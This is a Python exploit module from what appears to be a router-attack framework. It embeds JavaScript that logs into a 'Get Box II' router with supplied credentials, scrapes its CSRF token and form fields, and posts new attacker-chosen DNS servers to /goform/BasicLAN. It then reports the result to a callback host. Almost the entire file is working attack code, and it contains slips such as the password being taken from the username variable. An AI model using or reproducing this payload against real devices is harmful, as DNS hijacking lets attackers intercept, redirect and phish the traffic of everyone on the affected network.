#!/usr/bin/env python3
# This Source Code Form is subject to the terms of the Mozilla Public
# License, v. 2.0. If a copy of the MPL was not distributed with this
# file, You can obtain one at http://mozilla.org/MPL/2.0/.


from lib.module.exploit import ExploitClass
from lib.module import payload
from lib.module.safety import Safety
from lib.module.intrusiveness import Intrusiveness

class ExploitModule(ExploitClass):
    def __init__(self):
        super().__init__(**{
            'Name': '',
            'Description': """
            """,
            'Options': ["DNS1", "DNS1", "USERNAME", "PASSWORD"],
            'Ports': [80],
            'classification': (Safety.SAFE, Intrusiveness.NONE),
            'products':[
                {"product":"Get Box II", "info":"Authenticated"}
            ]
        })

    def exploit_code(self, payload):
        code = """
var username = "${USERNAME}";
var pass = "${USERNAME}";
function done(xhr, method, resource, data, user, pass)  {
    var status = "failure"
    if(xhr != null && xhr.status == 200)   {
        status = "success";
    }
    // Report back status
    Network.request("POST", "${HOME}" + "/module/finished/" + document.domain + "/${MODID}/" + status, console.log);
}
function receive_response(xhr, method, resource, data, user, pass)   {
    console.log(xhr);
    if(xhr.status == 200)   {
        // Create element from the text-string
        var el = document.createElement('html');
        el.innerHTML = xhr.text;

        // Retrieve the input form elements
        var csrf = el.getElementsByName("SecureFormToken")[0].value;
        var lang = "en_US";
        var dns1 = "${DNS1}";
        var dns2 = "${DNS2}";
        var landomain = el.getElementsByName("BasicLANDomainName")[0].value;
        var logoutaction = el.getElementsByName("LogoutApplyAction")[0].value;

        // Create an object we can serialize into the POST body request
        var obj = {
            "SelectLanguage": lang,
            "LogoutApplyAction": logoutaction,
            "SecureFormToken": csrf,
            "BasicLANDNSServer1": dns1,
            "BasicLANDNSServer2": dns2,
            "BasicLANDomainName": landomain
        };
        Network.request_advanced("POST", "/goform/BasicLAN", Misc.serialize(obj), done, null, null, username, pass);
    }
    else    {
        // Report back that we failed
        done(null);
    }
}
Network.request_advanced("GET", "/BasicLAN.asp", null, receive_response, null, null, username, pass);
        """
        return code
